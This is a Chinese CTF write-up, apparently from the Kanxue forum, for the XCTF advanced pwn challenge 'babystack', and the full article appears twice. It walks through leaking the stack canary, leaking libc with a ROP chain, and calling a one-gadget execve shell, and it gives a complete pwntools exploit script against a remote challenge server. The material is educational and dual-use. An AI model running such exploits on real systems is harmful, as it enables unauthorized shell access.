
# [原创]攻防世界pwn高手进阶区pwn1

## 0x00 查看文件信息

![](upload/attach/201909/812762_4BPQFKHENK9MTYV.png)

64位程序，动态链接，然后保护开的差不多了

## 0x01 静态分析

程序无`system()`，无`"/bin/sh"`，但是程序有`libc`（有`libc`表示有获得shell的函数），这就比较好办了，

在`libc`中找以一下shell的地址

![](upload/attach/201909/812762_3668QK5MEV9RBHG.png)

继续，分析`main()`

![](upload/attach/201909/812762_5RDZF87765YCREY.png)

`v8`就是那个标志`canary`，程序有个输出`puts()`，有`read()`，并且`read()`有一个非常明显的溢出（`s`的大小只有`0x90`，但是`read`读取了`0x100`大小的数据）

然后程序要求输入`1`/`2`/`3`进行选择下一步的操作

![](upload/attach/201909/812762_HM3UU4GMJXJEBSR.png)

## 0x02 思路

### 1

需要利用`puts()`泄露出标志`canary`，标志`canary`在`rbp`的上面，也就是在`s`的底部，所以当我们输入`0x88`个字节的时候，`puts()`就能够将标志`canary`输入出来

![](upload/attach/201909/812762_GBKXV3DPNHC82CB.png)

上图为输入`0x88`个`a`之后的堆栈情况其中`0x00007FFFF8B292A8`处标志`canary`（这个不是真正的`canary`，下面会说明），`0x00007FFFF8B292ABB`为返回地址，继续运行程序能够得到标志`canary`

![图片描述](upload/attach/201909/812762_83A9D326P9J6V36.png)

需要注意的是：`canary`的真实值应该是`0x502CB52AB5572700`，而不是`0x502CB52AB557270A`，这是因为在我们输入`0x88`个`'a'`时还输入了一个回车，这个回车将标志`canary`尾部的`'\x00'`覆盖为`'\x0A'`。另外正是因为这个回车覆盖掉`'\x00'`，才使得`puts()`能够输出标志`canary`，不然的话`puts()`在遇到`'\0'`时就停止输出了

所以我们可以用以下这段代码获得标志`canary`

```
payload = 'a'*0x88
p.sendlineafter(">> ","1")
p.sendline(payload)
p.sendlineafter(">> ","2")
p.recvuntil('a'*0x88+'\n')
```

### 2

在获得到标志`canary`之后，我们可以再次利用`puts()`泄露出`put()`的真实地址，这是为了应对ASLR

由于是64位程序，所以需要一个gadget，这个可以直接找到

![](upload/attach/201909/812762_YF2GZDJ8Q53WHZN.png)

```
payload1 = 'a'*0x88+p64(canary)+'a'*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter(">> ","1")
p.send(payload1)
p.sendlineafter(">> ","3")
puts_addr=u64(p.recv(8).ljust(8,'\x00'))
```

### 3

调用我们找到的`execve("/bin/sh")`

```
payload2 = 'a'*0x88+p64(canary)+'a'*8 + p64(execve_addr)
```

## 0x03 exp

```
from pwn import *
context.arch = "amd64"
context.log_level = "debug"
elf = ELF("./babystack")
p = remote('111.198.29.45','45381')
#p = process("./babystack")
libc = ELF("./libc-2.23.so")
execve = 0x45216
main_addr = 0x400908
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi = 0x0400a93
payload = 'a'*0x88
p.sendlineafter(">> ","1")
p.sendline(payload)
p.sendlineafter(">> ","2")
p.recvuntil('a'*0x88+'\n')
canary = u64(p.recv(7).rjust(8,'\x00'))
payload1 = 'a'*0x88+p64(canary)+'a'*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter(">> ","1")
p.send(payload1)
p.sendlineafter(">> ","3")
puts_addr=u64(p.recv(8).ljust(8,'\x00'))
execve_addr = puts_addr - (libc.symbols['puts'] - execve)
payload2 = 'a'*0x88+p64(canary)+'a'*8 + p64(execve_addr)
p.sendlineafter(">> ","1")
p.sendline(payload2)
p.sendlineafter(">> ","3")
p.interactive()
```

若文章有错误处，还请指出

## 0x00 查看文件信息

![](https://bbs.kanxue.com/upload/attach/201909/812762_4BPQFKHENK9MTYV.png)

64位程序，动态链接，然后保护开的差不多了

## 0x01 静态分析

程序无`system()`，无`"/bin/sh"`，但是程序有`libc`，这就比较好办了，

在`libc`中找以一下shell的地址

![](https://bbs.kanxue.com/upload/attach/201909/812762_3668QK5MEV9RBHG.png)

继续，分析`main()`

![](https://bbs.kanxue.com/upload/attach/201909/812762_5RDZF87765YCREY.png)

`v8`就是那个标志`canary`，程序有个输出`puts()`，有`read()`，并且`read()`有一个非常明显的溢出（`s`的大小只有`0x90`，但是`read`读取了`0x100`大小的数据）

然后程序要求输入`1`/`2`/`3`进行选择下一步的操作

![](https://bbs.kanxue.com/upload/attach/201909/812762_HM3UU4GMJXJEBSR.png)

## 0x02 思路

### 1

需要利用`puts()`泄露出标志`canary`，标志`canary`在`rbp`的上面，也就是在`s`的底部，所以当我们输入`0x88`个字节的时候，`puts()`就能够将标志`canary`输入出来

![](https://bbs.kanxue.com/upload/attach/201909/812762_GBKXV3DPNHC82CB.png)

上图为输入`0x88`个`a`之后的堆栈情况其中`0x00007FFFF8B292A8`处标志`canary`（这个不是真正的`canary`，下面会说明），`0x00007FFFF8B292ABB`为返回地址，继续运行程序能够得到标志`canary`

![图片描述](https://bbs.kanxue.com/upload/attach/201909/812762_83A9D326P9J6V36.png)

需要注意的是：`canary`的真实值应该是`0x502CB52AB5572700`，而不是`0x502CB52AB557270A`，这是因为在我们输入`0x88`个`'a'`时还输入了一个回车，这个回车将标志`canary`尾部的`'\x00'`覆盖为`'\x0A'`。另外正是因为这个回车覆盖掉`'\x00'`，才使得`puts()`能够输出标志`canary`，不然的话`puts()`在遇到`'\0'`时就停止输出了

所以我们可以用以下这段代码获得标志`canary`

```
payload = 'a'*0x88
p.sendlineafter(">> ","1")
p.sendline(payload)
p.sendlineafter(">> ","2")
p.recvuntil('a'*0x88+'\n')
```

### 2

在获得到标志`canary`之后，我们可以再次利用`puts()`泄露出`put()`的真实地址，这是为了应对ASLR

由于是64位程序，所以需要一个gadget，这个可以直接找到

![](https://bbs.kanxue.com/upload/attach/201909/812762_YF2GZDJ8Q53WHZN.png)

```
payload1 = 'a'*0x88+p64(canary)+'a'*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter(">> ","1")
p.send(payload1)
p.sendlineafter(">> ","3")
puts_addr=u64(p.recv(8).ljust(8,'\x00'))
```

### 3

调用我们找到的`execve("/bin/sh")`

```
payload2 = 'a'*0x88+p64(canary)+'a'*8 + p64(execve_addr)
```

## 0x03 exp

```
from pwn import *
context.arch = "amd64"
context.log_level = "debug"
elf = ELF("./babystack")
p = remote('111.198.29.45','45381')
#p = process("./babystack")
libc = ELF("./libc-2.23.so")
execve = 0x45216
main_addr = 0x400908
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi = 0x0400a93
payload = 'a'*0x88
p.sendlineafter(">> ","1")
p.sendline(payload)
p.sendlineafter(">> ","2")
p.recvuntil('a'*0x88+'\n')
canary = u64(p.recv(7).rjust(8,'\x00'))
payload1 = 'a'*0x88+p64(canary)+'a'*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter(">> ","1")
p.send(payload1)
p.sendlineafter(">> ","3")
puts_addr=u64(p.recv(8).ljust(8,'\x00'))
execve_addr = puts_addr - (libc.symbols['puts'] - execve)
payload2 = 'a'*0x88+p64(canary)+'a'*8 + p64(execve_addr)
p.sendlineafter(">> ","1")
p.sendline(payload2)
p.sendlineafter(">> ","3")
p.interactive()
```

若文章有错误处，还请指出

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
